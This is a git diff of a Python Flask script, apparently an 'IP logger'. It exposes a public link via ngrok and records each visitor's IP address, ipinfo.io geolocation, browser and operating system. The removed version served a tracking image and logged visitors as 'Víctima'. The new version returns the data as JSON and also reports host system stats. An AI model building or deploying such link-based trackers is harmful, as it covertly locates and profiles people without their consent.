@@ -1,72 +1,67 @@
-import os
-import json
+from flask import Flask, request, jsonify
+import platform
+import psutil
 import requests
-from flask import Flask, request, send_file
 from pyngrok import ngrok
-from PIL import Image, ImageDraw, ImageFont
-
-PORT = 5000
-NOMBRE_IMAGEN_ORIGINAL = r"ruta del archivo"  
-NOMBRE_IMAGEN_MODIFICADA = "imagen.png"  
-LOG_FILE = "log.txt"
+from user_agents import parse  
 
 app = Flask(__name__)
 
-def obtener_ubicacion(ip):
+def get_location(ip):
+    """ Obtiene la ubicación basada en la IP usando ipinfo.io """
     try:
-        respuesta = requests.get(f"https://ipinfo.io/{ip}/json")
-        datos = respuesta.json()
-        return datos.get("city", "Desconocido"), datos.get("region", "Desconocido"), datos.get("country", "Desconocido")
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        data = response.json()
+        return {
+            "City": data.get("city", "Unknown"),
+            "State": data.get("region", "Unknown"),
+            "Country": data.get("country", "Unknown")
+        }
     except:
-        return "Desconocido", "Desconocido", "Desconocido"
+        return {"City": "Unknown", "State": "Unknown", "Country": "Unknown"}
 
-def generar_imagen_personalizada(ip, ciudad, region, pais):
-    imagen = Image.open(NOMBRE_IMAGEN_ORIGINAL)
-    draw = ImageDraw.Draw(imagen)
+def get_system_info():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-    try:
-        font = ImageFont.truetype("arial.ttf", 20)  
-    except:
-        font = ImageFont.load_default()
+    location = get_location(ip)
 
-    texto = f"IP: {ip}\nUbicación: {ciudad}, {region}, {pais}"
-    draw.text((10, 10), texto, font=font, fill="red")
+    user_agent = request.headers.get("User-Agent", "Unknown")
+    parsed_ua = parse(user_agent)
 
-    imagen.save(NOMBRE_IMAGEN_MODIFICADA)
+    info = {
+        "IP": ip,
+        "City": location["City"],
+        "State": location["State"],
+        "Country": location["Country"],
+        "Browser": parsed_ua.browser.family,
+        "Browser Version": parsed_ua.browser.version_string,
+        "Operating System": parsed_ua.os.family,
+        "OS Version": parsed_ua.os.version_string,
+        "User Agent": user_agent,
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "CPU Cores": psutil.cpu_count(logical=False),
+        "Total CPU Usage": psutil.cpu_percent(interval=1),
+        "Total Memory (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
+        "Available Memory (GB)": round(psutil.virtual_memory().available / (1024 ** 3), 2),  
+        "Used Memory (GB)": round(psutil.virtual_memory().used / (1024 ** 3), 2),
+    }
+    return info
 
-@app.route("/imagen.png")
-def servir_imagen():
-    ip_victima = request.headers.get("X-Forwarded-For", request.remote_addr)
-    user_agent = request.headers.get("User-Agent")
+@app.route("/")
+def index():
+    user_info = get_system_info()
 
-    ciudad, region, pais = obtener_ubicacion(ip_victima)
-
-    with open(LOG_FILE, "a") as log:
-        log.write(f"IP: {ip_victima}, Ubicación: {ciudad}, {region}, {pais}, User-Agent: {user_agent}\n")
-
-    print(f"[💀] Víctima: {ip_victima} - {ciudad}, {region}, {pais} - {user_agent}")
-
-    generar_imagen_personalizada(ip_victima, ciudad, region, pais)
-
-    return send_file(NOMBRE_IMAGEN_MODIFICADA, mimetype='image/png')
-
-def iniciar_ngrok():
-    url_publico = ngrok.connect(PORT, "http")
-    print(f"[🌎] Link público: {url_publico}")
-    print(f"[📷] Imagen accesible en: {url_publico}/imagen.png")
-
-ascii_art = r"""
- _____ _____    _      ____   _____  _____ ______ _____  
-|_   _|  __ \  | |    / __ \ / ____|/ ____|  ____|  __ \ 
-  | | | |__) | | |   | |  | | |  __| |  __| |__  | |__) |
-  | | |  ___/  | |   | |  | | | |_ | | |_ |  __| |  _  / 
- _| |_| |      | |___| |__| | |__| | |__| | |____| | \ \ 
-|_____|_|      |______\____/ \_____|\_____|______|_|  \_\
-"""
+    print("\n📥 Nueva conexión:")
+    for key, value in user_info.items():
+        print(f"{key}: {value}")
+    
+    return jsonify(user_info)
 
 if __name__ == "__main__":
-    print(ascii_art)
-
-    iniciar_ngrok()
-
-    app.run(host="0.0.0.0", port=PORT, debug=False)
+    public_url = ngrok.connect(5000).public_url
+    print(f"🔗 Link público: {public_url}")
+    
+    app.run(host="0.0.0.0", port=5000)
